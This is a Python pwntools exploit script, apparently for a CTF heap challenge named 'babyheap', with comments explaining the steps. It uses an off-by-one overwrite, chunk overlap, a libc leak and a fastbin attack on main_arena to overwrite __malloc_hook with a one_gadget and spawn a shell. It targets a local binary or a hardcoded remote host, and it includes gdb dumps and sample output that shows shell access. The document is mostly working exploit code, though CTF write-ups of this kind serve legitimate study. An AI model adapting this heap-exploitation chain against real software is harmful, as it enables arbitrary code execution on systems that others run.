#!/usr/bin python
from pwn import *
import sys
'''
Try other style. No debug style~
'''

def allocate(size):
	p.recvuntil("Command: ")
	p.sendline('1')
	p.recvuntil("Size: ")
	p.sendline(str(size))

def update(index, size, content):
	p.recvuntil("Command: ")
	p.sendline('2')
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Size")
	p.sendline(str(size))
	p.recvuntil("Content: ")
	p.send(content)

def delete(index):
	p.recvuntil("Command: ")
	p.sendline('3')
	p.recvuntil("Index: ")
	p.sendline(str(index))

def view(index):
	p.recvuntil("Command: ")
	p.sendline('4')
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Chunk[%d]: " % index)
	return u64(p.recv(8))

def exploit(p):
	'''
	first, we must leak libc's address.
	As we all know, there is no libc address in heap memory 
	if we request fastbin-size memory and then free it.
	So it's a point to make a fake small chunk and then free it. 
	'''
	allocate(72) #0, PIE 0x55 or 0x56, off-by-one to overwite the size field
	allocate(72) #1
	allocate(72) #2
	allocate(72) #3

	#off-by-one
	update(0, 73, 'a'*72 + '\xa1') #not 0xb1
	delete(1)
	'''
	-------
	|  0  |
	-------------
	|     |     |
	-------	    |<----unsorted bin
	|  2  |     |
	-------------
	|  3  |
	-------
	'''
	allocate(72) #1
	'''
	-------
	|  0  |
	-------
	|  1  |     
	---------------------
	|  2  | overlapping |<----unsorted bin
	---------------------
	|  3  |
	-------
	'''
	leak_addr = view(2)
	print "[+] Leaking address: " + hex(leak_addr)
	libc_addr = leak_addr - 0x3c4b20 - 0x58
	main_arena = libc_addr + 0x3c4b20
	one_gadget = libc_addr + 0x4526a
	print '[+] libc address: ' + hex(libc_addr)
	print '[+] main_arena: ' + hex(main_arena)
	print '[+] one_gadget: ' + hex(one_gadget)
	'''
	Then we need to calculate the target address in main_arena.
	Let's have a look at the main_arena:
	gdb-peda$ p main_arena 
	$1 = {
  	mutex = 0x0, 
  	flags = 0x1, 
  	fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  	top = 0x55a016607140, 
  	last_remainder = 0x55a0166070a0, 
  	bins = {0x55a0166070a0, 0x55a0166070a0, 0x7fb465886b88 <main_arena+104>,
  	......}
  	Now the fastbin is empty, we must make 0x50 and 0x60 freelists not empty.
	'''
	allocate(72) #4 actully, it's the same with 2
	'''
	You might think we don't need to allocate(80), 
	But it won't work without it!
	'''
	allocate(80) #5 
	delete(4)
	delete(5)
	#raw_input("g0")
	'''
	check main_arena again
	gdb-peda$ x/20gx &main_arena 
	0x7f4d66f93b20 <main_arena>:	0x0000000000000000	0x0000000000000000
	0x7f4d66f93b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
	0x7f4d66f93b40 <main_arena+32>:	0x0000563b3c5140a0	0x0000563b3c514140
	0x7f4d66f93b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
	0x7f4d66f93b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
	0x7f4d66f93b70 <main_arena+80>:	0x0000000000000000	0x0000563b3c5141a0
	0x7f4d66f93b80 <main_arena+96>:	0x0000563b3c5140a0	0x00007f4d66f93b78
	0x7f4d66f93b90 <main_arena+112>:	0x00007f4d66f93b78	0x00007f4d66f93b88
	0x7f4d66f93ba0 <main_arena+128>:	0x00007f4d66f93b88	0x00007f4d66f93b98
	0x7f4d66f93bb0 <main_arena+144>:	0x00007f4d66f93b98	0x00007f4d66f93ba8
	gdb-peda$ p main_arena 
	$1 = {
  	mutex = 0x0, 
  	flags = 0x0, 
  	fastbinsY = {0x0, 0x0, 0x0, 0x563b3c5140a0, 0x563b3c514140, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  	top = 0x563b3c5141a0, 
  	last_remainder = 0x563b3c5140a0, 
  	bins = {0x7f4d66f93b78 <main_arena+88>, 0x7f4d66f93b78 <main_arena+88>, 
  	......}

 	So where is our target?
 	gdb-peda$ x/4gx 0x7f4d66f93b45
	0x7f4d66f93b45 <main_arena+37>:	0x3b3c514140000056	0x0000000000000056
	0x7f4d66f93b55 <main_arena+53>:	0x0000000000000000	0x0000000000000000

	it's clear our target is main_arena+37

	-------
	|  0  |
	-------
	|  1  |     
	------------------------
	|  2 alloc |  4 delete |
	------------------------
	|  3  |
	-------
	As if the program would be crashed if we don't do operation allocate(80).
	Because when the chunk is unlinked from the fastbin, the fd field 
	will be overwritten and the size field will be set 0.
	So we must add the operation allocate(80)
	'''
	target = main_arena + 37
	malloc_hook = libc_addr + 0x3c4b10
	print '[+] malloc_hook: ' + hex(malloc_hook)
	print '[+] target :' + hex(target)

	update(2, 8, p64(target))
	allocate(72) #4
	
	allocate(72) #5 
	
	#
	'''
	You can't directly overwrite main_arena.top with malloc_hook. See it:
	gdb-peda$ x/20gx 0x7f12095d9b10-0x40
	0x7f12095d9ad0 <_IO_wide_data_0+272>:	0x0000000000000000	0x0000000000000000
	0x7f12095d9ae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
	0x7f12095d9af0 <_IO_wide_data_0+304>:	0x00007f12095d8260	0x0000000000000000
	0x7f12095d9b00 <__memalign_hook>:	0x00007f120929ae20	0x00007f120929aa00
	0x7f12095d9b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
	0x7f12095d9b20 <main_arena>:	0x0000000100000001	0x0000000000000000
	A normal top chunk is just like this: 
	----------
	|pre_size|
	----------
	| size   |
	----------
	| payload|
	----------
	So we must find a proper address which contains size field.
	new_top = malloc_hook - 0x10 
	whatever, it just need to fit the condition.
	''' 
	new_top = malloc_hook - 0x28
	print '[+] new top chunk: ' + hex(new_top)
	payload = '\x00'*11 + '\x00'*24 + p64(new_top) 
	update(5, 43, payload)
	#raw_input("g0")
	#trigger allocting memory from top chunk
	allocate(0x20) #6

	update(6, 32, 'a' * 24 + p64(one_gadget))
	#raw_input('go')
	allocate(0x20)

	p.interactive()



if __name__ == '__main__':
	if len(sys.argv) == 1:
		p = process('./babyheap')
	else:
		p = remote('202.120.7.204', 127)

	exploit(p)

'''
->  babyheap python babyheap.py
[+] Starting local process './babyheap': pid 20191
[+] Leaking address: 0x7f0741be5b78
[+] libc address: 0x7f0741821000
[+] main_arena: 0x7f0741be5b20
[+] one_gadget: 0x7f074186626a
[+] malloc_hook: 0x7f0741be5b10
[+] target :0x7f0741be5b45
[+] new top chunk: 0x7f0741be5ae8
[*] Switching to interactive mode
$ whoami
w0lfzhang
'''